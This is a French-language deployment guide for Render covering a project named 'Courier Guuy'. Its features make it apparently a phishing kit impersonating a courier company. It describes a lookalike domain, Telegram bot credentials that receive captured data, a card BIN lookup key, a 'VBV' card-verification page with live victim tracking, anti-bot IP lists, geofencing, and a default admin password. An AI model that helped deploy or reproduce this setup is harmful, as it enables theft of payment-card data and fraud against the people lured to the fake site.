# 🚀 Guide de déploiement sur Render

Ce guide décrit comment déployer **Courier Guuy** sur [Render](https://render.com) à partir du dépôt GitHub.

---

## 📋 Prérequis

- Un compte [Render](https://render.com) (gratuit ou payant)
- Le projet **déjà poussé sur GitHub** (voir [DEPLOYMENT_GITHUB.md](DEPLOYMENT_GITHUB.md))
- Un **token Telegram** et un **chat ID** pour recevoir les données

---

## 1. Créer un Web Service sur Render

### 1.1 Connexion et nouveau service

1. Va sur **https://dashboard.render.com** et connecte-toi (ou crée un compte).
2. Clique sur **New +** → **Web Service**.
3. Si tu n’as pas encore connecté GitHub :
   - Clique sur **Connect account** pour **GitHub**.
   - Autorise Render à accéder à tes dépôts (tous ou le repo **courier-guuy** uniquement).
4. Dans la liste des repos, choisis **lefabmartin/courier-guuy** (ou ton fork).
5. Clique sur **Connect**.

### 1.2 Paramètres du service

Renseigne les champs suivants :

| Champ | Valeur |
|-------|--------|
| **Name** | `courier-guuy` (ou un nom de ton choix) |
| **Region** | **Frankfurt (EU Central)** (ou la région la plus proche) |
| **Branch** | `main` |
| **Runtime** | **Node** |
| **Build Command** | `npm install --include=dev && npm run build` |
| **Start Command** | `npm start` |
| **Instance Type** | **Free** (ou **Starter** pour éviter la mise en veille) |

> **Build Command** : `--include=dev` est nécessaire pour installer les devDependencies (`tsx`, Vite, etc.) utilisées pendant le build. Sans ça, Render installe uniquement les dépendances de production et le build échoue avec « tsx: not found ».
>
> Sur le plan **Free**, le service s’endort après ~15 min d’inactivité ; le premier chargement après réveil peut prendre 30–60 s.

---

## 2. Variables d’environnement

Dans la section **Environment** du service, ajoute les variables suivantes.  
**Secret** = cocher « Secret » sur Render pour masquer la valeur (obligatoire pour tokens, mots de passe, clés API).

### Obligatoires (minimum pour que l’app fonctionne)

| Key | Value | Secret |
|-----|--------|--------|
| `NODE_ENV` | `production` | Non (pas une donnée sensible) |
| `SESSION_SECRET` | Une chaîne aléatoire longue (voir ci‑dessous) | **Oui** |
| `TELEGRAM_BOT_TOKEN` | Ton token du bot Telegram | **Oui** |
| `TELEGRAM_CHAT_ID` | L’ID du chat où envoyer les messages | **Oui** |

**Comment remplir SESSION_SECRET :**  
Ce n’est pas un mot de passe que tu choisis : c’est une **clé aléatoire** que l’app utilise pour signer les sessions. Tu dois la **générer** une fois, puis coller le résultat dans la colonne « Value » sur Render.

1. Ouvre un terminal et exécute :
   ```bash
   openssl rand -base64 32
   ```
2. La commande affiche une ligne du type : `K7gN3xR2mP9qL1vY4wZ8...` (une longue chaîne de caractères).
3. **Copie** toute cette ligne (sans espace avant/après).
4. Sur Render, pour la variable `SESSION_SECRET`, colle cette chaîne dans **Value** et coche **Secret** (icône cadenas).

### Recommandées

| Key | Value | Secret |
|-----|--------|--------|
| `ADMIN_PASSWORD` | Mot de passe pour `/admin` et `/ozyadmin` | **Oui** |

Si tu ne le définis pas, le défaut est `music2018` (à changer en production).

### Optionnelles

| Key | Description |
|-----|-------------|
| `HCAPTCHA_SITE_KEY` | Clé site hCaptcha (widget) |
| `HCAPTCHA_SECRET_KEY` | Clé secrète hCaptcha (vérification serveur) |
| `BINCODES_API_KEY` | Clé API BIN (infos carte) |
| `ALLOWED_COUNTRIES` | Pays autorisés, séparés par des virgules (ex. `CM,MA,US`) |

Tu peux ajouter ces variables plus tard dans **Environment**.

**Si le site est servi depuis un autre domaine que le backend** (ex. front en statique sur `thcourierguy.cpem.info`, backend sur Render) : au **build**, définis `VITE_API_ORIGIN` avec l’URL du backend (ex. `https://courier-guuy-xxxx.onrender.com`). Ainsi les appels API (`/api/telegram/send`, etc.) partent vers le bon serveur. Sur Render, ajoute `VITE_API_ORIGIN` dans **Environment** avec la valeur de l’URL du service (même URL que le site si tout est sur le même service).

> **Important :** Ne définis **pas** `PORT` : Render l’injecte automatiquement. L’app utilise déjà `process.env.PORT || "3000"`.

---

## 3. Déployer

1. Vérifie une dernière fois **Build Command** et **Start Command**.
2. Clique sur **Create Web Service**.
3. Render va :
   - cloner le repo ;
   - exécuter `npm install && npm run build` ;
   - lancer `npm start`.
4. Une fois le déploiement vert (**Live**), l’app est accessible à l’URL du type :  
   **https://thcourierguy.cpem.info/** (ou https://courier-guuy-xxxx.onrender.com si pas de domaine personnalisé)

---

## 4. Après le déploiement

### Vérifications

- Ouvre l’URL du service : la page d’accueil (Security Check puis redirection) doit s’afficher.
- Teste le flux (formulaires, etc.) et vérifie que les messages arrivent dans Telegram.
- Va sur **https://thcourierguy.cpem.info/admin** (ou `/ozyadmin`) et connecte-toi avec `ADMIN_PASSWORD` (ou le défaut).

### Données non versionnées

Les fichiers suivants ne sont **pas** dans le repo (voir `.gitignore`) :

- `allowed-countries.json` : créé/édité via l’admin (onglet Geo). Au premier déploiement, le fichier n’existe pas ; l’app peut créer une liste vide ou tu la configures depuis le panel.
- `antibot-config.json` : idem, configurable depuis l’admin (onglet Anti-Bot).
- `whitelist.txt` / `blacklist.txt` / `botfuck.txt` : listes d’IP ; en environnement éphémère (Render), ces fichiers peuvent être recréés à chaque déploiement. Pour persister, il faudrait un disque persistant (plan payant) ou une base externe.

Sur le plan **Free**, le système de fichiers est **éphémère** : à chaque redéploiement ou réveil, les fichiers créés par l’app (config, listes) peuvent être perdus. Pour une config durable, privilégie les **variables d’environnement** (pays autorisés via `ALLOWED_COUNTRIES`, etc.).

### Sessions et déconnexions

- **Admin (OzyAdmin)** : la session est stockée **en mémoire**. Sur Render **Free**, l’instance s’endort après ~15 min d’inactivité ; au réveil, le processus redémarre et la session est perdue → il faut se reconnecter à `/admin`. Sur un plan payant (instance toujours active), la session reste valide jusqu’à expiration (7 jours) ou déconnexion.
- **Clients VBV (liste dans le panel)** : la liste des visiteurs sur la page VBV est aussi en mémoire. Un visiteur est marqué « hors ligne » après **2 min** sans heartbeat, et retiré de la liste après **3 min** supplémentaires (~5 min au total sans activité). Si l’instance Render redémarre (sleep ou redeploy), la liste est vidée. Les heartbeats sont envoyés toutes les 5 s par le client.

---

## 5. Mises à jour (re-déploiement)

Dès que tu pousses sur la branche **main** sur GitHub :

1. Render détecte le push (si l’auto-deploy est activé, c’est le cas par défaut).
2. Un nouveau build est lancé (`npm install && npm run build`).
3. Le service est redémarré avec `npm start`.

Pour forcer un déploiement sans push : **Dashboard** → ton service → **Manual Deploy** → **Deploy latest commit**.

---

## 6. Option : Blueprint (render.yaml)

Le projet contient un fichier **`render.yaml`** à la racine (Blueprint Render). Tu peux l’utiliser pour créer le service d’un coup :

1. **Dashboard** → **New +** → **Blueprint**.
2. Connecte le repo **courier-guuy**.
3. Render lit `render.yaml` et crée le **Web Service** avec les options définies (build, start, région, etc.).
4. Il reste à ajouter les **variables d’environnement** (SESSION_SECRET, Telegram, etc.) dans l’onglet **Environment** du service créé.

Référence : [Render Blueprint Spec](https://render.com/docs/blueprint-spec).

---

## 7. Domaine personnalisé (optionnel)

1. Dans le service : **Settings** → **Custom Domains**.
2. Clique sur **Add Custom Domain** et saisis ton domaine (ex. `app.ton-domaine.com`).
3. Render affiche un **CNAME** à configurer chez ton registrar (ex. `courier-guuy-xxxx.onrender.com`).
4. Une fois le DNS propagé, Render provisionne le certificat SSL (HTTPS).

---

## 8. Dépannage

### Le build échoue

- Vérifie les **logs** du build (onglet **Logs** du service).
- Assure-toi que **Build Command** est bien `npm install --include=dev && npm run build`.
- Node : Render utilise une version récente (20+) ; le projet demande `"node": ">=20"` dans `package.json`.

### Le service ne démarre pas (crash)

- Consulte les **logs** après le build (phase "Starting service").
- Vérifie que **Start Command** est `npm start` (pas `node server/index.ts`).
- Vérifie la présence des variables **obligatoires** (au moins `SESSION_SECRET`, `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`).

### 502 Bad Gateway / timeout

- Sur le plan **Free**, le service peut être en veille ; attends 30–60 s et réessaie.
- Vérifie que l’app écoute bien sur `process.env.PORT` (c’est le cas avec `PORT || "3000"`).

### Les messages n’arrivent pas sur Telegram

- Vérifie **TELEGRAM_BOT_TOKEN** et **TELEGRAM_CHAT_ID** (valeurs secrètes correctes, sans espaces).
- Teste le bot en local avec les mêmes variables pour confirmer que l’envoi fonctionne.

---

## 9. Résumé des commandes / config

| Élément | Valeur |
|--------|--------|
| **Build Command** | `npm install --include=dev && npm run build` |
| **Start Command** | `npm start` |
| **Variables minimales** | `NODE_ENV`, `SESSION_SECRET`, `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID` |
| **Port** | Fourni par Render (ne pas définir `PORT`) |

---

## 10. Voir aussi

- [README principal](../README.md) — présentation du projet et commandes locales.
- [DEPLOYMENT_GITHUB.md](DEPLOYMENT_GITHUB.md) — publier le projet sur GitHub.
- [env.example](../env.example) — liste des variables d’environnement (copier en `.env` en local).
- [Documentation Render](https://render.com/docs) — hébergement, Blueprint, domaines, logs.
